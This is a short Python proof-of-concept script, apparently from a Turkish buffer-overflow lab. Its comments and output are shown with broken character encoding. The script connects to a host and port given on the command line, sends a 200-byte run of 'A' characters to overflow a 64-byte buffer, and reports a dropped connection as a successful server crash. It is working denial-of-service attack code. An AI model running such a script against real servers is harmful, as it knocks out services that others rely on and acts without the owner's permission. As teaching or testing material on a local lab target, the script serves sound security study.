import socket
import time
import sys

# Renkler
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

def crash_server(target_ip, target_port):
    print(f"{RED}[*] StackSmash BaÅŸlatÄ±lÄ±yor... Hedef: {target_ip}:{target_port}{RESET}")
    
    # Payload oluÅŸturma
    # Buffer 64 byte. Biz 200 byte yollarsak bellek taÅŸar (Overflow).
    # "A" harfinin hex karÅŸÄ±lÄ±ÄŸÄ± \x41'dir.
    payload = b"A" * 200
    
    print(f"[*] Payload hazÄ±rlanÄ±yor: {len(payload)} bytes of pain.")
    
    try:
        # BaÄŸlantÄ± kur
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        # SaldÄ±rÄ±yÄ± yap
        print(f"{RED}[!] Payload gÃ¶nderiliyor... BOOM! ğŸ’¥{RESET}")
        s.send(payload)
        
        # YanÄ±t bekle (EÄŸer sunucu Ã§Ã¶kerse yanÄ±t gelmez)
        response = s.recv(1024)
        print(f"{GREEN}[+] Sunucu hala hayatta (BaÅŸarÄ±sÄ±z): {response}{RESET}")
        s.close()
        
    except Exception as e:
        print(f"{GREEN}[+] BaÄŸlantÄ± koptu! Sunucu Ã‡Ã–KMÃœÅ olabilir! (BaÅŸarÄ±lÄ±){RESET}")
        print(f"Hata detayÄ±: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("KullanÄ±m: python3 exploit.py <IP> <PORT>")
        print("Ã–rnek: python3 exploit.py 127.0.0.1 9999")
        sys.exit(1)
        
    crash_server(sys.argv[1], int(sys.argv[2]))
